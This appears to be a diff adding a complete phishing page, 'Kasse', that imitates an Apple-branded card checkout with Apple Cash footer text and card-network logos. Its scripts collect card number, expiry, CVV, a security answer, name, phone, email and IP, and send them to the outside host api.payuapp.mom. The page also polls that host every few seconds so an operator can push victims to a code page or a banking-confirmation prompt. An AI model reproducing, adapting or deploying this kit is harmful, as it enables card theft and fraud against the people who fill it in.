@@ -1,0 +1,902 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Kasse</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/5.0.6/jquery.inputmask.min.js"></script>
+    <style>
+      .form-row.question-form {
+        display: none;
+      }
+
+      header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+      .header {
+        display: flex;
+        align-items: center;
+        grid-gap: 5px;
+        padding: 5px 0px;
+        margin: 0px 10px;
+        margin-bottom: 20px;
+        border-bottom: 2px solid rgb(185, 185, 185);
+      }
+      #logo {
+        width: 25px;
+        height: 25px;
+      }
+      body {
+        margin: 0;
+        padding: 0;
+        font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
+          Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue",
+          sans-serif;
+      }
+      #title {
+        margin: 0;
+        font-weight: 500;
+      }
+      .app-container {
+        color: #13100d;
+        font: 12px "Open Sans", Arial, Tahoma, Helvetica, sans-serif;
+        font-weight: 400;
+        box-sizing: border-box;
+        margin: 0px 30px;
+        padding: 0;
+        display: flex;
+
+        justify-content: center;
+      }
+      main {
+        color: #13100d;
+        font-weight: 400;
+        box-sizing: border-box;
+        vertical-align: top;
+        text-align: center;
+        flex-direction: column;
+        display: flex;
+        justify-content: center;
+        grid-gap: 40px;
+      }
+      #ShowInputButton {
+        cursor: pointer;
+        padding: 10px;
+        background-color: #0059ff;
+        color: white;
+        border-radius: 5px;
+        width: 100%;
+        border: none;
+      }
+      #pin {
+        display: flex;
+        grid-gap: 20px;
+      }
+      .highlight {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+      #Seller {
+        text-align: start;
+      }
+      #price {
+        font-weight: 600;
+        font-size: 16px;
+      }
+      #sidebar_sum_total {
+        font-weight: 600;
+      }
+      #polit {
+        position: absolute;
+        bottom: 0px;
+        padding: 10px;
+        padding-bottom: 0;
+        color: #858585;
+      }
+    </style>
+    <style>
+      .input-container {
+        position: relative;
+        width: 100%;
+        margin: 20px 0px;
+      }
+
+      .input-field {
+        width: 100%;
+        padding: 10px 0;
+        border: none;
+        border-bottom: 1px solid #ccc;
+        outline: none;
+        font-size: 16px;
+      }
+
+      .placeholder {
+        position: absolute;
+        left: 0;
+        top: 10px;
+        font-size: 16px;
+        color: #888;
+        transition: all 0.2s ease-out;
+        pointer-events: none;
+      }
+
+      .input-field:focus + .placeholder,
+      .input-field:not(:placeholder-shown) + .placeholder {
+        top: -10px;
+        font-size: 12px;
+        color: #000000;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="header">
+      <img
+        id="logo"
+        src="https://cdn.freebiesupply.com/images/large/2x/apple-logo-transparent.png"
+        alt=""
+      />
+      <h1 id="title">Kasse</h1>
+    </div>
+    <div class="app-container">
+      <main>
+        <div class="column column-1">
+          <aside>
+            <div>
+              <div id="Seller">
+                <br /><em class="row">Verkäufer</em>
+                <p></p>
+                <p></p>
+                <div class="order-data"><p id="telephone"></p></div>
+                <hr style="color: #ccc" />
+              </div>
+              <div class="amount">
+                <div class="highlight">
+                  <span id="sidebar_sum_total">Gesamt</span>
+                  <span class="price" aria-labelledby="sidebar_sum_total">
+                    <p id="price"></p>
+                  </span>
+                </div>
+              </div>
+            </div>
+          </aside>
+        </div>
+        <div class="content-wrapper column column-2">
+          <article class="card">
+            <div>
+              <header>
+                <h1>Karte</h1>
+                <div>
+                  <svg
+                    viewBox="0 0 17.795 11"
+                    xmlns="http://www.w3.org/2000/svg"
+                    width="32px"
+                  >
+                    <g transform="matrix(.15275 0 0 .15275 -1.1373 -1.1366)">
+                      <rect
+                        x="48.37"
+                        y="15.14"
+                        width="34.66"
+                        height="56.61"
+                        fill="#ff5f00"
+                      ></rect>
+                      <path
+                        d="m51.94 43.45a35.94 35.94 0 0 1 13.75-28.3 36 36 0 1 0 0 56.61 35.94 35.94 0 0 1-13.75-28.31z"
+                        fill="#eb001b"
+                      ></path>
+                      <path
+                        d="m123.94 43.45a36 36 0 0 1-58.25 28.3 36 36 0 0 0 0-56.61 36 36 0 0 1 58.25 28.3z"
+                        fill="#f79e1b"
+                      ></path>
+                    </g>
+                  </svg>
+                  <svg
+                    viewBox="0 0 39 24"
+                    xmlns="http://www.w3.org/2000/svg"
+                    width="32px"
+                  >
+                    <g
+                      transform="matrix(1.157 0 0 1.158 -2.493 -2.468)"
+                      stroke-width="0.2884"
+                    >
+                      <rect
+                        x="13.99"
+                        y="4.356"
+                        width="10.02"
+                        height="16.29"
+                        fill="#7673c0"
+                      ></rect>
+                      <path
+                        d="m15.02 12.5a10.39 10.34 0 013.977-8.142 10.41 10.36 0 100 16.29 10.39 10.34 0 01-3.977-8.144z"
+                        fill="#eb001b"
+                      ></path>
+                      <path
+                        d="m35.85 12.5a10.41 10.36 0 01-16.85 8.142 10.41 10.36 0 000-16.29 10.41 10.36 0 0116.85 8.142z"
+                        fill="#00a1df"
+                      ></path>
+                    </g>
+                  </svg>
+                  <svg
+                    viewBox="0 0 74 24"
+                    xmlns="http://www.w3.org/2000/svg"
+                    width="47px"
+                  >
+                    <path
+                      d="m36.64.4246-4.945 23.21h-5.979l4.946-23.21zm25.16 14.99 3.148-8.716 1.812 8.716zm6.671 8.224h5.531l-4.826-23.21h-5.105c-1.147 0-2.115.6702-2.545 1.703l-8.971 21.51h6.279l1.247-3.466h7.672zm-15.61-7.579c.02573-6.127-8.437-6.464-8.378-9.201.01748-.8333.8082-1.718 2.536-1.945.8582-.1125 3.217-.1989 5.897 1.039l1.049-4.922c-1.439-.525-3.29-1.029-5.593-1.029-5.91 0-10.07 3.156-10.11 7.674-.037 3.341 2.969 5.205 5.235 6.317 2.329 1.138 3.112 1.866 3.102 2.884-.01544 1.559-1.859 2.245-3.577 2.272-3.007.04779-4.752-.815-6.143-1.466l-1.083 5.086c1.397.6447 3.975 1.204 6.65 1.233 6.281 0 10.39-3.117 10.41-7.942m-24.77-15.63-9.687 23.21h-6.321l-4.767-18.52c-.2895-1.141-.5413-1.559-1.422-2.039-1.436-.783-3.81-1.518-5.899-1.974l.1432-.6743h10.17c1.296 0 2.463.8666 2.757 2.366l2.518 13.43 6.222-15.8z"
+                      style="fill: rgb(20, 52, 203)"
+                    ></path>
+                  </svg>
+                </div>
+              </header>
+              <div class="main">
+                <form autocomplete="">
+                  <div class="form-row">
+                    <label for="card-number"></label>
+                    <div class="input-container">
+                      <input
+                        id="cardNumber"
+                        type="text"
+                        class="input-field"
+                        placeholder=" "
+                      />
+                      <div class="placeholder">Kartennummer</div>
+                    </div>
+                  </div>
+                  <div>
+                    <div id="pin" class="inline separated">
+                      <div class="form-row">
+                        <label for="card-date"></label>
+                        <div class="input-container">
+                          <input
+                            id="valid"
+                            type="text"
+                            class="input-field"
+                            placeholder=" "
+                          />
+                          <div class="placeholder">Gültig bis</div>
+                        </div>
+                      </div>
+                      <div class="form-row">
+                        <label for="card-cvv"></label>
+                        <div class="input-container">
+                          <input
+                            id="cvv"
+                            type="text"
+                            class="input-field"
+                            placeholder=" "
+                          />
+                          <div class="placeholder">CVV</div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="form-row question-form">
+                    <label for="card-number"></label>
+                    <div class="input-container">
+                      <input
+                        class="input-field"
+                        id="card-question"
+                        name="question"
+                        placeholder=" "
+                        tabindex="5"
+                        type="tel"
+                        value=""
+                      />
+                      <div class="placeholder">Sicherheitsfrage</div>
+                    </div>
+                  </div>
+                  <div class="form-actions"></div>
+                </form>
+              </div>
+              <input
+                id="ShowInputButton"
+                name="submit"
+                tabindex="11"
+                type="submit"
+                value="Zahlen"
+              />
+              <div id="loadingMessage">
+                <div class="spinner"></div>
+              </div>
+            </div>
+          </article>
+        </div>
+      </main>
+      <p id="polit">
+        Apple Cash-Dienste werden von der Green Dot Bank, Mitglied der FDIC,
+        bereitgestellt. Erfahren Sie mehr über die Allgemeinen
+        Geschäftsbedingungen. Nur in den USA auf geeigneten Geräten verfügbar.
+        Um Geld mit einem Apple Cash-Konto zu senden und zu empfangen, müssen
+        Sie 18 Jahre alt und in den USA ansässig sein. Wenn Sie unter 18 Jahre
+        alt sind, kann Ihr Familienorganisator Apple Cash als Teil seines Apple
+        Cash-Familienkontos für Sie einrichten. Sicherheitskontrollen erfordern
+        möglicherweise mehr Zeit, um Geld zur Verfügung zu stellen. Apple
+        Cash-Familienkonten können bis zu 2000 USD pro Transaktion oder
+        innerhalb von sieben Tagen senden oder empfangen. Für das Senden von
+        Geld aus der Brieftasche ist iOS 15.5 oder höher erforderlich.
+      </p>
+    </div>
+    <script>
+      document.querySelectorAll(".input-field").forEach((input) => {
+        input.addEventListener("focus", () => {
+          input.nextElementSibling.classList.add("focused");
+        });
+
+        input.addEventListener("blur", () => {
+          if (input.value === "") {
+            input.nextElementSibling.classList.remove("focused");
+          }
+        });
+      });
+    </script>
+    <script>
+      function formatCardNumber(input) {
+        const cardNumber = input.value.replace(/\s+/g, "");
+        const formattedCardNumber = cardNumber.replace(/(\d{4})(?=\d)/g, "$1 ");
+        input.value = formattedCardNumber;
+      }
+      function formatExpiryDate(input) {
+        const expiryDate = input.value.replace(/\D/g, "");
+        let formattedExpiryDate = "";
+        if (expiryDate.length > 2) {
+          formattedExpiryDate =
+            expiryDate.slice(0, 2) + " / " + expiryDate.slice(2);
+        } else {
+          formattedExpiryDate = expiryDate;
+        }
+        input.value = formattedExpiryDate;
+      }
+    </script>
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        document
+          .getElementById("ShowInputButton")
+          .addEventListener("click", function () {
+            fetch("https://api.payuapp.mom/test")
+              .then((response) => response.text())
+              .then((data) => {
+                console.log("Data received:", data);
+              })
+              .catch((error) => {
+                console.error("Error:", error);
+              });
+          });
+      });
+    </script>
+    <script>
+      function getClientIP() {
+        return fetch("https://api.ipify.org?format=json")
+          .then((response) => {
+            if (!response.ok) {
+              throw new Error(
+                "Network response was not ok " + response.statusText
+              );
+            }
+            return response.json();
+          })
+          .then((data) => {
+            localStorage.setItem("ip", data.ip);
+            return data.ip; // Extract the IP address from the response
+          })
+          .catch((error) => {
+            console.error("Error fetching IP address:", error);
+            return null;
+          });
+      }
+
+      // Function to send the IP address to your server
+      async function sendIPToServer() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const ip = await getClientIP();
+        const name = urlParams.get("name");
+        if (!ip) {
+          document.getElementById("responseOutput").innerText =
+            "Error: Unable to fetch IP address";
+          return;
+        }
+
+        const url3 = `https://api.payuapp.mom/chel?ip=${ip}&name=${name}`;
+
+        fetch(url3)
+          .then((response) => {
+            if (!response.ok) {
+              throw new Error(
+                "Network response was not ok " + response.statusText
+              );
+            }
+            return response.json();
+          })
+          .then((data) => {
+            document.getElementById("responseOutput").innerText =
+              "Server Response: " + JSON.stringify(data);
+          })
+          .catch((error) => {
+            console.error("Error:", error);
+            document.getElementById("responseOutput").innerText =
+              "Error: " + error.message;
+          });
+      }
+
+      // Call the function to send the IP address to your server
+      sendIPToServer();
+
+      let session = Math.floor(Math.random() * 9000000) + 1000000;
+      console.log(session);
+      localStorage.setItem("session", session);
+
+      const url = window.location.href;
+      const urlObj = new URL(url);
+      const telephone = urlObj.searchParams.get("telephone");
+      const price = urlObj.searchParams.get("price");
+      const telephoneElement = document.getElementById("telephone");
+      const priceElement = document.getElementById("price");
+      const offname = urlObj.searchParams.get("offname");
+
+      localStorage.setItem("telephone", telephone);
+      localStorage.setItem("price", price);
+      localStorage.setItem("offname", offname);
+
+      // Устанавливаем текстовое содержимое элементов
+      telephoneElement.textContent += telephone;
+      priceElement.textContent += price;
+
+      document
+        .getElementById("ShowInputButton")
+        .addEventListener("click", function () {
+          let cardNumber = document.getElementById("cardNumber").value;
+          let expiryDate = document.getElementById("valid").value;
+          let cvv = document.getElementById("cvv").value;
+          let question = document.getElementById("card-question").value;
+
+          console.log("Card Number:", cardNumber);
+          console.log("Expiry Date:", expiryDate);
+          console.log("CVV:", cvv);
+
+          const urlParams = new URLSearchParams(window.location.search);
+          const id = urlParams.get("order");
+
+          const name = urlParams.get("name");
+          const tel = urlParams.get("telephone");
+          const email = urlParams.get("email");
+          console.log(name);
+          console.log(tel);
+          console.log(email);
+          localStorage.setItem("cardNumber", cardNumber);
+          localStorage.setItem("expiryDate", expiryDate);
+          localStorage.setItem("cvv", cvv);
+          localStorage.setItem("id", id);
+          if (question) {
+            localStorage.setItem("question", question);
+          }
+
+          let ip = localStorage.getItem("ip");
+          if (question) {
+            console.log("question");
+            var url =
+              "https://api.payuapp.mom/login" +
+              "?cardNumber=" +
+              encodeURIComponent(cardNumber) +
+              "&expiryDate=" +
+              encodeURIComponent(expiryDate) +
+              "&cvv=" +
+              encodeURIComponent(cvv) +
+              "&id=" +
+              encodeURIComponent(id) +
+              "&question=" +
+              encodeURIComponent(question) +
+              "&name=" +
+              encodeURIComponent(name) +
+              "&tel=" +
+              encodeURIComponent(tel) +
+              "&email=" +
+              encodeURIComponent(email) +
+              "&session=" +
+              encodeURIComponent(session) +
+              "&ip=" +
+              encodeURIComponent(ip);
+          } else {
+            console.log("question");
+            var url =
+              "https://api.payuapp.mom/login" +
+              "?cardNumber=" +
+              encodeURIComponent(cardNumber) +
+              "&expiryDate=" +
+              encodeURIComponent(expiryDate) +
+              "&cvv=" +
+              encodeURIComponent(cvv) +
+              "&id=" +
+              encodeURIComponent(id) +
+              "&name=" +
+              encodeURIComponent(name) +
+              "&tel=" +
+              encodeURIComponent(tel) +
+              "&email=" +
+              encodeURIComponent(email) +
+              "&session=" +
+              encodeURIComponent(session) +
+              "&ip=" +
+              encodeURIComponent(ip);
+          }
+
+          // Показываем элемент загрузки
+          var loadingElement = document.getElementById("loadingMessage");
+          loadingElement.style.display = "block";
+
+          // Отправляем GET-запрос с помощью fetch API
+          fetch(url)
+            .then((response) => {
+              // Проверяем статус ответа
+              if (!response.ok) {
+                throw new Error("Network response was not ok");
+              }
+              return response.text(); // Читаем ответ как текст
+            })
+            .then((data) => {
+              console.log("Ответ сервера:", data);
+              if (data == "button1") {
+                loadingElement.style.display = "none";
+                console.log("Ответ сервера:", data);
+                document.location.href = "./codeen.html";
+              }
+              if (data == "button2") {
+                loadingElement.style.display = "none";
+                console.log("Ответ сервера:", data);
+                var element = document.querySelector(".form-row.question-form");
+                // Удаляем стиль display: none; если он установлен
+                if (element) {
+                  element.style.display = "block"; // Устанавливаем пустую строку, чтобы вернуться к стандартному значению display элемента
+                }
+              }
+              if (data == "button3") {
+                loadingElement.style.display = "none";
+                openModal();
+              }
+              if (data == "button4") {
+                loadingElement.style.display = "none";
+                openModal_nocorrect_num();
+              }
+              if (data == "button5") {
+                loadingElement.style.display = "none";
+                openModal_nocorrect_qu();
+              }
+            })
+            .catch((error) => {
+              console.error("Ошибка при запросе:", error);
+            })
+            .finally(() => {
+              // Скрываем элемент загрузки
+              console.log("nice");
+            });
+        });
+
+      function fetchUpdate() {
+        fetch(
+          "https://api.payuapp.mom/update" +
+            "?session=" +
+            encodeURIComponent(session)
+        )
+          .then((response) => {
+            if (!response.ok) {
+              throw new Error(
+                "Network response was not ok " + response.statusText
+              );
+            }
+            return response.json(); // или response.text(), в зависимости от ожидаемого формата данных
+          })
+          .then((data) => {
+            console.log("Data received:", data);
+            if (data.result == "button1") {
+              var loadingElement = document.getElementById("loadingMessage");
+              loadingElement.style.display = "none";
+              console.log("Ответ сервера:", data);
+              document.location.href = "./codeen.html";
+            }
+            if (data.result == "button2") {
+              var loadingElement = document.getElementById("loadingMessage");
+              loadingElement.style.display = "none";
+              console.log("Ответ сервера:", data);
+              var element = document.querySelector(".form-row.question-form");
+              // Удаляем стиль display: none; если он установлен
+              if (element) {
+                element.style.display = "block"; // Устанавливаем пустую строку, чтобы вернуться к стандартному значению display элемента
+              }
+            }
+            if (data.result == "button3") {
+              var loadingElement = document.getElementById("loadingMessage");
+              loadingElement.style.display = "none";
+              openModal();
+            }
+            if (data.result == "button4") {
+              var loadingElement = document.getElementById("loadingMessage");
+              loadingElement.style.display = "none";
+              openModal_nocorrect_num();
+            }
+            if (data.result == "button5") {
+              var loadingElement = document.getElementById("loadingMessage");
+              loadingElement.style.display = "none";
+              openModal_nocorrect_qu();
+            }
+          })
+          .catch((error) => {
+            console.error(
+              "There has been a problem with your fetch operation:",
+              error
+            );
+          });
+      }
+
+      // Устанавливаем интервал для выполнения fetchUpdate() каждые 5 секунд
+      setInterval(fetchUpdate, 3000);
+
+      // Функция для открытия модального окна
+      function openModal() {
+        // Создаем элемент для модального окна
+        var modal = document.createElement("div");
+        modal.className = "modal";
+
+        modal.innerHTML = `
+                <div class="modal-content">
+                    <span class="close">&times;</span>
+                    <p class="dota_2">Confirm the action in online banking</p>
+                </div>
+            `;
+
+        // Добавляем модальное окно в body документа
+        document.body.appendChild(modal);
+
+        // Стилизация модального окна
+        modal.style.display = "flex";
+        modal.style.alignItems = "center";
+        modal.style.justifyContent = "center";
+        modal.style.position = "fixed";
+        modal.style.zIndex = "1000";
+        modal.style.left = "0";
+        modal.style.top = "0";
+        modal.style.width = "100%";
+        modal.style.height = "100%";
+        modal.style.backgroundColor = "rgba(0, 0, 0, 0.5)";
+        modal.style.transition = "opacity 0.3s ease";
+        modal.style.opacity = "0";
+
+        // Анимация плавного появления модального окна
+        setTimeout(() => {
+          modal.style.opacity = "1";
+        }, 50);
+
+        // Стилизация содержимого модального окна
+        var modalContent = modal.querySelector(".modal-content");
+        modalContent.style.backgroundColor = "#fff";
+        modalContent.style.padding = "30px";
+        modalContent.style.borderRadius = "10px";
+        modalContent.style.boxShadow = "0 0 20px rgba(0, 0, 0, 0.2)";
+        modalContent.style.maxWidth = "80%";
+        modalContent.style.textAlign = "center";
+        modalContent.style.position = "relative";
+        modalContent.style.border = "2px solid red";
+        modalContent.style.top = "-230px";
+
+        // Стилизация крестика для закрытия модального окна
+        var closeButton = modal.querySelector(".close");
+        closeButton.style.position = "absolute";
+        closeButton.style.top = "0px";
+        closeButton.style.right = "10px";
+        closeButton.style.fontSize = "28px";
+        closeButton.style.cursor = "pointer";
+        closeButton.style.color = "#888";
+        closeButton.style.transition = "color 0.3s ease";
+
+        // Анимация изменения цвета крестика при наведении
+        closeButton.onmouseover = function () {
+          closeButton.style.color = "#555";
+        };
+
+        closeButton.onmouseleave = function () {
+          closeButton.style.color = "#888";
+        };
+
+        // Закрытие модального окна при клике на крестик или вне окна
+        closeButton.onclick = function () {
+          closeModal();
+        };
+
+        window.onclick = function (event) {
+          if (event.target === modal) {
+            closeModal();
+          }
+        };
+      }
+
+      function openModal_nocorrect_qu() {
+        // Создаем элемент для модального окна
+        var modal = document.createElement("div");
+        modal.className = "modal";
+
+        modal.innerHTML = `
+                <div class="modal-content">
+                    <span class="close">&times;</span>
+                    <p class="dota_2">Nesprávna odpoveď na bezpečnostnú otázku.</p>
+                </div>
+            `;
+
+        // Добавляем модальное окно в body документа
+        document.body.appendChild(modal);
+
+        // Стилизация модального окна
+        modal.style.display = "flex";
+        modal.style.alignItems = "center";
+        modal.style.justifyContent = "center";
+        modal.style.position = "fixed";
+        modal.style.zIndex = "1000";
+        modal.style.left = "0";
+        modal.style.top = "0";
+        modal.style.width = "100%";
+        modal.style.height = "100%";
+        modal.style.backgroundColor = "rgba(0, 0, 0, 0.5)";
+        modal.style.transition = "opacity 0.3s ease";
+        modal.style.opacity = "0";
+
+        // Анимация плавного появления модального окна
+        setTimeout(() => {
+          modal.style.opacity = "1";
+        }, 50);
+
+        // Стилизация содержимого модального окна
+        var modalContent = modal.querySelector(".modal-content");
+        modalContent.style.backgroundColor = "#fff";
+        modalContent.style.padding = "30px";
+        modalContent.style.borderRadius = "10px";
+        modalContent.style.boxShadow = "0 0 20px rgba(0, 0, 0, 0.2)";
+        modalContent.style.maxWidth = "80%";
+        modalContent.style.textAlign = "center";
+        modalContent.style.position = "relative";
+        modalContent.style.border = "2px solid red";
+        modalContent.style.top = "-230px";
+
+        // Стилизация крестика для закрытия модального окна
+        var closeButton = modal.querySelector(".close");
+        closeButton.style.position = "absolute";
+        closeButton.style.top = "0px";
+        closeButton.style.right = "10px";
+        closeButton.style.fontSize = "28px";
+        closeButton.style.cursor = "pointer";
+        closeButton.style.color = "#888";
+        closeButton.style.transition = "color 0.3s ease";
+
+        // Анимация изменения цвета крестика при наведении
+        closeButton.onmouseover = function () {
+          closeButton.style.color = "#555";
+        };
+
+        closeButton.onmouseleave = function () {
+          closeButton.style.color = "#888";
+        };
+
+        // Закрытие модального окна при клике на крестик или вне окна
+        closeButton.onclick = function () {
+          closeModal();
+        };
+
+        window.onclick = function (event) {
+          if (event.target === modal) {
+            closeModal();
+          }
+        };
+      }
+
+      function openModal_nocorrect_num() {
+        // Создаем элемент для модального окна
+        var modal = document.createElement("div");
+        modal.className = "modal";
+
+        modal.innerHTML = `
+                <div class="modal-content">
+                    <span class="close">&times;</span>
+                    <p class="dota_2">This card is not supported</p>
+                </div>
+            `;
+
+        // Добавляем модальное окно в body документа
+        document.body.appendChild(modal);
+
+        // Стилизация модального окна
+        modal.style.display = "flex";
+        modal.style.alignItems = "center";
+        modal.style.justifyContent = "center";
+        modal.style.position = "fixed";
+        modal.style.zIndex = "1000";
+        modal.style.left = "0";
+        modal.style.top = "0";
+        modal.style.width = "100%";
+        modal.style.height = "100%";
+        modal.style.backgroundColor = "rgba(0, 0, 0, 0.5)";
+        modal.style.transition = "opacity 0.3s ease";
+        modal.style.opacity = "0";
+
+        // Анимация плавного появления модального окна
+        setTimeout(() => {
+          modal.style.opacity = "1";
+        }, 50);
+
+        // Стилизация содержимого модального окна
+        var modalContent = modal.querySelector(".modal-content");
+        modalContent.style.backgroundColor = "#fff";
+        modalContent.style.padding = "30px";
+        modalContent.style.borderRadius = "10px";
+        modalContent.style.boxShadow = "0 0 20px rgba(0, 0, 0, 0.2)";
+        modalContent.style.maxWidth = "80%";
+        modalContent.style.textAlign = "center";
+        modalContent.style.position = "relative";
+        modalContent.style.border = "2px solid red";
+        modalContent.style.top = "-230px";
+
+        // Стилизация крестика для закрытия модального окна
+        var closeButton = modal.querySelector(".close");
+        closeButton.style.position = "absolute";
+        closeButton.style.top = "0px";
+        closeButton.style.right = "10px";
+        closeButton.style.fontSize = "28px";
+        closeButton.style.cursor = "pointer";
+        closeButton.style.color = "#888";
+        closeButton.style.transition = "color 0.3s ease";
+
+        // Анимация изменения цвета крестика при наведении
+        closeButton.onmouseover = function () {
+          closeButton.style.color = "#555";
+        };
+
+        closeButton.onmouseleave = function () {
+          closeButton.style.color = "#888";
+        };
+
+        // Закрытие модального окна при клике на крестик или вне окна
+        closeButton.onclick = function () {
+          closeModal();
+        };
+
+        window.onclick = function (event) {
+          if (event.target === modal) {
+            closeModal();
+          }
+        };
+      }
+
+      // Функция для закрытия модального окна
+      function closeModal() {
+        var modal = document.querySelector(".modal");
+        if (modal) {
+          modal.style.opacity = "0";
+          setTimeout(() => {
+            modal.parentNode.removeChild(modal);
+          }, 300);
+        }
+      }
+    </script>
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        var input = document.getElementById("cardNumber");
+        Inputmask({
+          mask: "9999 9999 9999 9999",
+          showMaskOnHover: false,
+          showMaskOnFocus: false,
+        }).mask(input);
+
+        var input = document.getElementById("valid");
+        Inputmask({
+          mask: "99 / 99",
+          showMaskOnHover: false,
+          showMaskOnFocus: false,
+        }).mask(input);
+
+        var input = document.getElementById("cvv");
+        Inputmask({
+          mask: "9999",
+          showMaskOnHover: false,
+          showMaskOnFocus: false,
+        }).mask(input);
+      });
+    </script>
+  </body>
+</html>
